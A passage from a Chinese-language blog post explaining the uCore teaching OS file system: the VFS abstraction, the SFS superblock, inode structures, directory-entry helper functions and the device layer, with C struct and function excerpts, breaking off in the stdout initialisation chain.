class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> __<span class="hljs-title">sfs_info</span>;</span>                   <br>    &#125; fs_info;                                     <span class="hljs-comment">// filesystem-specific data </span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        fs_type_sfs_info,<br>    &#125; fs_type;                                     <span class="hljs-comment">// filesystem type </span><br>    <span class="hljs-keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="hljs-comment">// Flush all dirty buffers to disk </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *(*<span class="hljs-title">fs_get_root</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>);</span>   <span class="hljs-comment">// Return root inode of filesystem.</span><br>    <span class="hljs-keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="hljs-comment">// Attempt unmount of filesystem.</span><br>    <span class="hljs-keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="hljs-comment">// Cleanup of filesystem.???</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><hr><p>所以VFS具体是怎么个抽象法儿呢? </p><p>首先是对PCB中的文件进行抽象, 弄一个files_struct管理fd_array, 每个文件使用file进行定义, file中有基本的打开计数权限索引等等, 处于一个非常高的抽象层, 而且是针对用户的.</p><p>file中包含了一个index node, node记录了设备文件和SFS文件的inode信息(元数据), <strong>向下给sfs_inode和device提供了接口</strong>.</p><p>inode包含一个struct fs*, <strong>而fs向下接到了SFS层的sys_fs</strong>结构体, 这个才是具体到文件系统的总体信息, 比如super dev bitmap, 这些都是文件的磁盘布局信息.</p><p>当我们需要对文件file层面操作的时候(比如在path下查找 创建 删除等), 我们可以调用file对应inode(元数据)的函数指针, 实际上是调用了sfs层的函数去进行下一步的操作.</p><h3 id="4-SFS层"><a href="#4-SFS层" class="headerlink" title="4.SFS层"></a>4.SFS层</h3><p>SFS文件系统中目录和常规文件具有共同的属性，而这些属性保存在索引节点中。SFS通过索引节点来管理目录和常规文件，索引节点包含操作系统所需要的关于某个文件的关键信息，比如文件的属性、访问许可权以及其它控制信息都保存在索引节点中。多个文件名可指向一个索引节点。</p><h4 id="函数接口与数据结构"><a href="#函数接口与数据结构" class="headerlink" title="函数接口与数据结构"></a>函数接口与数据结构</h4><blockquote><p>在sfs.h中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sfs_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_mount</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_super</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_freemap</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_clear_block</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_load_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct inode **node_store, <span class="hljs-keyword">uint32_t</span> ino)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> struct inode* <span class="hljs-title">sfs_get_root</span><span class="hljs-params">(struct fs *fs)</span> </span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_unmount</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sfs_cleanup</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_init_read</span><span class="hljs-params">(struct device *dev, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">void</span> *blk_buffer)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_do_mount</span><span class="hljs-params">(struct device *dev, struct fs **fs_store)</span></span>;<br><span class="hljs-comment">// ......</span><br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>其实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* filesystem for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> <span class="hljs-title">super</span>;</span>                         <span class="hljs-comment">/* on-disk superblock */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>                             <span class="hljs-comment">/* device mounted on */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bitmap</span> *<span class="hljs-title">freemap</span>;</span>                         <span class="hljs-comment">/* blocks in use are mared 0 */</span><br>    <span class="hljs-keyword">bool</span> super_dirty;                               <span class="hljs-comment">/* true if super/freemap modified */</span><br>    <span class="hljs-keyword">void</span> *sfs_buffer;                               <span class="hljs-comment">/* buffer for non-block aligned io 缓冲区起始地址*/</span><br>    <span class="hljs-keyword">semaphore_t</span> fs_sem;                             <span class="hljs-comment">/* semaphore for fs */</span><br>    <span class="hljs-keyword">semaphore_t</span> io_sem;                             <span class="hljs-comment">/* semaphore for io */</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex_sem;                          <span class="hljs-comment">/* semaphore for link/unlink and rename */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_list;                        <span class="hljs-comment">/* inode linked-list 应该是在内存中的*/</span><br>    <span class="hljs-keyword">list_entry_t</span> *hash_list;                        <span class="hljs-comment">/* inode hash linked-list */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>结构中包含了底层设备的超级块<code>superblock</code>、所挂载的设备<code>dev</code>、以及底层设备中用于表示空间分配情况的<code>freemap</code>等。</p><h4 id="文件系统布局"><a href="#文件系统布局" class="headerlink" title="文件系统布局"></a>文件系统布局</h4><p><img src="../../image/ucore/image-20220105200753016.png" alt="image-20220105200753016"></p><p>文件系统通常保存在磁盘上。在本实验中，第三个磁盘（即disk0，前两个磁盘分别是 ucore.img 和 swap.img）用于存放一个SFS文件系统（Simple Filesystem）。通常文件系统中，磁盘的使用是以扇区（Sector）为单位的，但是为了实现简便，SFS 中以 <strong>block</strong> （4K，与内存 page 大小相等）为基本单位。</p><p>第0个块(4K)是<strong>superblock</strong>，它包含了关于文件系统的所有关键参数，当计算机被启动或文件系统被首次接触时，超级块的内容就会被装入内存。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> magic;                                  <span class="hljs-comment">/* magic number, should be SFS_MAGIC */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                 <span class="hljs-comment">/* # of blocks in fs */</span><br>    <span class="hljs-keyword">uint32_t</span> unused_blocks;                         <span class="hljs-comment">/* # of unused blocks in fs */</span><br>    <span class="hljs-keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="hljs-number">1</span>];                <span class="hljs-comment">/* infomation for sfs  */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>magic number就是一串神秘莫测的数字, 这里用来标识SFS文件系统, 值为0x2f8dbe2a</p></blockquote><p>需要注意的是虽然inode的大小小于一个块的大小（4096B），<strong>但为了实现简单，每个 inode 都占用一个完整的 block。</strong> </p><p>在sfs_fs.c文件中的<code>sfs_do_mount</code>函数中，完成了加载位于硬盘上的SFS文件系统的超级块superblock和freemap的工作。这样，在内存中就有了SFS文件系统的全局信息。</p><h4 id="索引节点"><a href="#索引节点" class="headerlink" title="索引节点"></a>索引节点</h4><p>在<code>sfs</code>层面上，<code>inode</code>结构既可表示文件<code>file</code>、目录<code>dir</code>，也可表示设备<code>device</code>。而区分<code>inode</code>结构的操作有两种，一种是其<code>in_info</code>成员变量，另一种是该结构的成员指针<code>in_ops</code>。以下是函数<code>sfs_get_ops</code>的源码，该函数返回某个属性（文件/目录）所对应的<code>inode</code>操作：</p><blockquote><p>注意，设置inode_ops的操作不止一处，以下代码只作为示例。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_get_ops - return function addr of fs_node_dirops/sfs_node_fileops</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> struct inode_ops *</span><br><span class="hljs-function"><span class="hljs-title">sfs_get_ops</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> type)</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span> (type) &#123;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_DIR:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_dirops;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_FILE:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_fileops;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;invalid file type %d.\n&quot;</span>, type);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当uCore创建一个<strong>用于存储文件/目录</strong>的<code>inode</code>结构（即该<code>inode</code>结构的<code>in_info</code>成员变量为<code>sfs_inode</code>类型）时，程序会执行函数<code>sfs_create_inode</code>。该函数会<strong>将<code>inode</code>结构中的<code>sfs_inode</code>成员与磁盘对应结点<code>sfs_disk_inode</code>相关联</strong>，从而使得只凭<code>inode</code>即可操作该结点。 </p><blockquote><p>比如在打开文件的时候, 需要调用<code>sfs_dirent_search_nolock</code>查找路径对应inode, 如果找到了会返回ino编号, 然后调用<code>sfs_load_inode</code>根据ino和sfs找到对应inode, 把对应<code>sfs_disk_inode</code>读到内存中, 然后调用**<code>sfs_create_inode</code>**, 初始化<code>inode</code>里的<code>sfs_inode</code>.</p></blockquote><blockquote><p>用于描述设备<code>device</code>的<code>inode</code>会在其他函数中被初始化，不会执行函数<code>sfs_create_inode</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_create_inode - alloc a inode in memroy, and init din/ino/dirty/reclian_count/sem fields in sfs_inode in inode</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_create_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_disk_inode *din, <span class="hljs-keyword">uint32_t</span> ino, struct inode **node_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span><br>    <span class="hljs-keyword">if</span> ((node = alloc_inode(sfs_inode)) != <span class="hljs-literal">NULL</span>) &#123;<br>        vop_init(node, sfs_get_ops(din-&gt;type), info2fs(sfs, sfs));<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> *<span class="hljs-title">sin</span> =</span> vop_info(node, sfs_inode);<br>        <span class="hljs-built_in">sin</span>-&gt;din = din, <span class="hljs-built_in">sin</span>-&gt;ino = ino, <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">0</span>, <span class="hljs-built_in">sin</span>-&gt;reclaim_count = <span class="hljs-number">1</span>;<br>        sem_init(&amp;(<span class="hljs-built_in">sin</span>-&gt;sem), <span class="hljs-number">1</span>);<br>        *node_store = node;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_NO_MEM;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="磁盘索引节点"><a href="#磁盘索引节点" class="headerlink" title="磁盘索引节点"></a>磁盘索引节点</h5><p>就是<code>sfs_disk_inode </code>, understand结构图中最后一个结构体, <strong>保存在磁盘上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> size;                                  <span class="hljs-comment">/* size of the file (in bytes) */</span><br>    <span class="hljs-keyword">uint16_t</span> type;                                  <span class="hljs-comment">/* one of SYS_TYPE_* above */</span><br>    <span class="hljs-keyword">uint16_t</span> nlinks;                                <span class="hljs-comment">/* # of hard links to this file */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                <span class="hljs-comment">/* # of blocks */</span><br>    <span class="hljs-keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="hljs-comment">/* direct blocks 存储的是ino编号*/</span><br>    <span class="hljs-keyword">uint32_t</span> indirect;                              <span class="hljs-comment">/* indirect blocks */</span><br><span class="hljs-comment">//    uint32_t db_indirect;                           /* double indirect blocks */</span><br><span class="hljs-comment">//   unused</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于文件, <u>索引值</u><strong>指向的</strong>是数据块.</p><p>对于目录, <u>索引值</u><strong>指向的</strong>是下面这个结构体。数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* file entry (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_entry</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">//索引节点所占数据块索引值</span><br>    <span class="hljs-keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="hljs-number">1</span>];               <span class="hljs-comment">//文件名</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="内存索引节点"><a href="#内存索引节点" class="headerlink" title="内存索引节点"></a>内存索引节点</h5><p>即<code>sfs_inode</code>.  需要注意，一个内存inode是在打开一个文件后才创建的，如果关机则相关信息都会消失。<br>而硬盘inode(即<code>sfs_disk_inode</code>)的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span>;</span>                     <span class="hljs-comment">/* on-disk inode 一对一指针*/</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">/* inode number */</span><br>    <span class="hljs-keyword">bool</span> dirty;                                     <span class="hljs-comment">/* true if inode modified */</span><br>    <span class="hljs-keyword">int</span> reclaim_count;                              <span class="hljs-comment">/* kill inode if it hits zero */</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;                                <span class="hljs-comment">/* semaphore for din */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_link;                        <span class="hljs-comment">/* entry for linked-list in sfs_fs */</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;                         <span class="hljs-comment">/* entry for hash linked-list in sfs_fs */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>为了方便实现上面提到的多级数据的访问以及目录中 entry 的操作，对 inode SFS实现了一些<strong>辅助的函数</strong>：</p><ol><li><code>sfs_bmap_load_nolock</code>：将对应 sfs_inode 的第 index 个索引指向的 block 的<strong>索引值</strong>取出存到相应的指针指向的单元（ino_store）。该函数只接受 index &lt;= inode-&gt;blocks 的参数。当 index == inode-&gt;blocks 时，该函数理解为需要为 inode 增长一个 block。<strong>并标记 inode 为 dirty</strong>（所有对 inode 数据的修改都要做这样的操作，这样，当 inode 不再使用的时候，sfs 能够保证 inode 数据能够被写回到磁盘）。sfs_bmap_load_nolock 调用的 sfs_bmap_get_nolock 来完成相应的操作, 分为直接索引和间接索引两种情况, <u>完成ino的load操作</u>.（sfs_bmap_get_nolock 只由 sfs_bmap_load_nolock 调用）</li><li><code>sfs_bmap_truncate_nolock</code>：将多级数据索引表的最后一个 entry 释放掉。<strong>他可以认为是 sfs_bmap_load_nolock 中，index == inode-&gt;blocks 的逆操作</strong>(检测到时就会从freemap中alloc一个)。当一个文件或目录被删除时，sfs 会循环调用该函数直到 inode-&gt;blocks 减为 0，释放所有的数据页。函数通过 sfs_bmap_free_nolock 来实现，他应该是 sfs_bmap_get_nolock 的逆操作。和 sfs_bmap_get_nolock 一样，调用 sfs_bmap_free_nolock 也要格外小心。</li><li><code>sfs_dirent_read_nolock</code>：将目录的第 slot 个 entry 读取到指定的内存空间。他通过上面提到的函数来完成。</li><li><code>sfs_dirent_search_nolock</code>：是常用的查找函数。他在目录下查找 name，并且返回相应的搜索结果（文件或文件夹）的 inode 的编号（<strong>也是磁盘编号</strong>），和相应的 entry 在该目录的 index 编号以及目录下的数据页是否有空闲的 entry。（SFS 实现里文件的数据页是连续的，不存在任何空洞；而对于目录，数据页不是连续的，当某个 entry 删除的时候，SFS 通过设置 entry-&gt;ino 为0将该 entry 所在的 block 标记为 free，在需要添加新 entry 的时候，SFS 优先使用这些 free 的 entry，其次才会去在数据页尾追加新的 entry.)</li></ol><blockquote><p> 从下到上表明了他们之间的包含关系. 注意到<code>dirent</code>是指<code>directory entry</code>, 最后两个函数专用于目录</p></blockquote><p><strong>注意，这些后缀为 nolock 的函数，只能在已经获得相应 inode 的semaphore才能调用。</strong> </p><hr><h4 id="Inode的文件-目录操作函数"><a href="#Inode的文件-目录操作函数" class="headerlink" title="Inode的文件,目录操作函数"></a>Inode的文件,目录操作函数</h4><p>这些操作函数使用结构体+函数指针来定义, 在inode结构体中被赋值.</p><ul><li>首先是文件操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>sfs_openfile不用做什么事；sfs_close需要把对文件的修改内容写回到硬盘上，这样确保硬盘上的文件内容数据是最新的；sfs_read和sfs_write函数都调用了一个函数sfs_io，并最终通过访问硬盘驱动来完成对文件内容数据的读写。</p><ul><li>然后是目录操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于目录操作而言，由于目录也是一种文件，所以sfs_opendir、sys_close对应户进程发出的open、close函数。相对于sfs_open，sfs_opendir只是完成一些open函数传递的参数判断，没做其他更多的事情。目录的close操作与文件的close操作完全一致。由于目录的内容数据与文件的内容数据不同，所以读出目录的内容数据的函数是sfs_getdirentry，其主要工作是获取目录下的文件inode信息。</p><h3 id="5-device层"><a href="#5-device层" class="headerlink" title="5.device层"></a>5.device层</h3><blockquote><p>目前实现了stdin设备文件文件、stdout设备文件、disk0设备。stdin设备就是键盘，stdout设备就是CONSOLE（串口、并口和文本显示器），而disk0设备是承载SFS文件系统的磁盘设备。(无情的复制机器)</p></blockquote><p>为了表示一个设备，需要有对应的数据结构，ucore为此定义了struct device，其描述如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span> d_blocks;    <span class="hljs-comment">//设备占用的数据块个数            </span><br>    <span class="hljs-keyword">size_t</span> d_blocksize;  <span class="hljs-comment">//数据块的大小</span><br>    <span class="hljs-keyword">int</span> (*d_open)(struct device *dev, <span class="hljs-keyword">uint32_t</span> open_flags);  <span class="hljs-comment">//打开设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_close)(struct device *dev); <span class="hljs-comment">//关闭设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write); <span class="hljs-comment">//读写设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_ioctl)(struct device *dev, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data); <span class="hljs-comment">//用ioctl方式控制设备的函数指针</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这个数据结构能够支持对块设备（比如磁盘）、字符设备（比如键盘、串口）的表示，完成对设备的基本操作。ucore虚拟文件系统为了把这些设备链接在一起，还定义了一个设备链表，即双向链表<strong>vdev_list</strong>，这样通过访问此链表，可以找到ucore能够访问的所有设备文件。</p><p>但这个设备描述没有与文件系统以及表示一个文件的inode数据结构建立关系，为此，还需要另外一个数据结构把device和inode联通起来，这就是vfs_dev_t数据结构：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// device info entry in vdev_list </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">devnode</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>;</span><br>    <span class="hljs-keyword">bool</span> mountable;<br>    <span class="hljs-keyword">list_entry_t</span> vdev_link;<br>&#125; <span class="hljs-keyword">vfs_dev_t</span>;<br></code></pre></div></td></tr></table></figure><p>利用<code>vfs_dev_t</code>数据结构，就可以让文件系统通过一个链接<code>vfs_dev_t</code>结构的双向链表找到device对应的inode数据结构，一个inode节点的成员变量in_type的值是0x1234，则此 inode的成员变量in_info将成为一个device结构。这样inode就和一个设备建立了联系，这个inode就是一个设备文件。</p><blockquote><p>对于文件来说, inode-&gt;in_info是sfs_inode类型, 记录了文件在磁盘上的信息;<br>而对于设备来说, 是device类型, 存储着针对于device的操作函数和相关信息.1</p></blockquote><h4 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h4><p><strong>初始化</strong> </p><p>既然stdout设备是设备文件系统的文件，自然有自己的inode结构。在系统初始化时，即只需如下处理过程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kern_init--&gt;fs_init--&gt;dev_init--&gt;dev_init_stdout --&gt; dev_create_inode<br>                 --&gt; stdout_device_init<br>                 --&gt; 